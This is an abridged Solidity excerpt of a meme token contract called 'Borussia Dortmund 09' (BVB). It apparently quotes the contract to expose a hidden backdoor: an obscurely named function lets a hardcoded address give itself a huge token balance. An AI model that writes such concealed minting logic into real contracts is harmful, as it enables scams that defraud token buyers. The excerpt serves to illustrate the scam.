...
contract MEMEToken is Ownable {
    ...
    function lllindadddceoadmin() external {
        ...
        if (_lindaceo488!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo488 == tswojaks){
            _balances[_lindaceo488] = adminSupply()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo488 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Borussia Dortmund 09";
    string _symbol = "BVB";
